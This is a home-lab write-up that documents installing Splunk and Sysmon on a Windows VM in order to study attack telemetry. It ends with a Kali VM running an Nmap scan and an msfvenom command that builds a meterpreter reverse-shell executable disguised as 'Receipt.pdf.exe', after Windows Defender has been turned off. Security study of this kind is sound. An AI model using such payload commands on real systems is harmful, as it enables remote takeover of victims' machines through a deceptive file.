# Experimenting with Splunk & Sysmon

## Objective

The Experimenting with Splunk & Sysmon project is where I will be documenting the process of installing both Splunk and Sysmon into the home lab environment created in my previous project. My hope is to better my understanding of the functions of a SIEM and to view/explore telemetry created by a malware attack.

### Skills Learned/Improved

- Placeholder Skill - will be updated in future

### Tools/Technologies Used

- Placeholder Tool/Technology - will be updated in future

# Steps

## Installing Splunk
### Allowing Internet Access
- Splunk is being installed on the Windows 11 VM which means the first step is to change the internet adapter in VirtualBox to allow internet access through the VM
- I changed it from Internal Network back to NAT
- Then in the VM, I switched the ethernet from manual IPv4 back to automatic
- This time I went through the Windows settings UI instead of the Ethernet properties followed by IPv4 properties:
<img width="1221" height="749" alt="Pasted image 20251021172732" src="https://github.com/user-attachments/assets/33636be8-5b0c-4886-968d-2b9a16221318" />

- I also checked back in the IPv4 properties section later and saw the change was reflected there as expected
- This will all need to be reverted later when testing Splunk/Sysmon with the Kali Linux VM acting as an attacker
### Actual Installation
- First I downloaded Firefox (I prefer Firefox over Microsoft Edge)
- Then I quickly went to https://splunk.com and to the enterprise tab to start a free trial and download the .msi file
- The current version of Splunk as of this project is 10.0.1
- I also downloaded the associated SHA512 file from the Splunk website
- After using Get-FileHash with ***-Algorithm SHA512***, it returned a matching hash which verified the integrity of the download
- I then followed the installation wizard and created an administrator account for the program
- The installation then took another 5-10 minutes to complete
- And with that, Splunk Enterprise is now running on port 8000
- This was verified by going to `http://127.0.0.1:8000` where I could enter the admin account credentials and access the SIEM:
<img width="1268" height="747" alt="Pasted image 20251021193929" src="https://github.com/user-attachments/assets/2cc3c0dd-8b86-4cf7-bf4d-da449a3b5b58" />

## Installing Sysmon
- I started this section by going to https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon to download Sysmon
- I then downloaded a Sysmon configuration file by going to the following github link: https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml
- I went to the raw file to download just the xml
- Sysmon was downloaded as a zip file which was extracted again to the Downloads folder
- I then launched PowerShell as an Administrator and used cd to go into the extracted Sysmon directory
- I also moved the sysmonconfig.xml file into the same directory
- Next I ran ***.\Sysmon64.exe -i sysmonconfig.xml*** which installed Sysmon and loaded the configuration file simultaneously:
<img width="971" height="509" alt="Pasted image 20251021220813" src="https://github.com/user-attachments/assets/51beab26-2dce-40ab-a5b4-19ddd2e49322" />

- I lastly opened the services app to ensure Sysmon was installed and running in the VM:
<img width="862" height="603" alt="Pasted image 20251021223015" src="https://github.com/user-attachments/assets/51a851e1-d70f-4657-8012-25a58b3fdc7c" />

## Generating Telemetry
- I started by moving the Windows 11 VM back into the internal network and changing the IPv4 address back to **10.1.1.2**
- I also increased the memory to 7 GB in both the Windows 11 and Kali Linux VMs
### Scanning the Windows VM with Nmap
- The first step here is to disable Windows Defender to allow the scan to go through and later the crafted malware to not be blocked
- I also went into Windows settings to enable Remote Desktop Protocol (RDP):
<img width="1213" height="406" alt="Pasted image 20251022191043" src="https://github.com/user-attachments/assets/ee347660-abfc-4713-9d2b-85ea0ccaf587" />

- Now on to the actual Nmap scan, the command used was `nmap -A 10.1.1.2 -Pn`
- The **-A** flag is for a more in depth scan that enables OS and version detection, script scanning, and traceroute
- The **-Pn** flag skips host discovery and assumes the host is online which is true in this case
- The resulting scan returned that there were 6 open ports out of 1000:
<img width="698" height="563" alt="Pasted image 20251022193145" src="https://github.com/user-attachments/assets/840b945f-0802-4047-ac83-a9ac650d41fe" />

- Port 3389 is the RDP port and other notable ports are 8000 and 8089 which are both used by Splunk that was installed earlier in the project
- Obviously I knew that the RDP port would be open but chose to still use Nmap to simulate performing reconnaissance and ensure the port was open/reachable by the Kali VM
### Setting Up Malware on the Kali VM
- The malware payload will be created using MSFvenom on the Kali VM
- After launching a terminal, I used `msfvenom -l payloads` to view a list of possible payloads to be used during the test
- For this test, I will be using the `windows/x64/meterpreter_reverse_tcp` payload:
<img width="847" height="440" alt="Pasted image 20251022202708" src="https://github.com/user-attachments/assets/00f2875b-60cf-4f65-9973-4dbbc098d54f" />

- Now to build the malware, I used the command `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.1.1.3 lport=4444 -f exe -o Receipt.pdf.exe`
- Each flag in the command is used to customize the malware for this specific use case:
	- **-p** designates the payload being used
	- **lhost** is the local host IP (the Kali VM for this use)
	- **lport** is the local port being used (4444 is the default meterpreter port)
	- **-f** is for the output format (I am making an executable)
	- **-o** is for the output path (Receipt.pdf.exe)
- So the malware output will be a meterpreter reverse tcp payload that will communicate back to the Kali VM through port 4444:
<img width="847" height="156" alt="Pasted image 20251022221551" src="https://github.com/user-attachments/assets/468134ba-98bd-4965-8c10-8a8f182b6846" />

- Current progress, will be updated with the execution of the malware
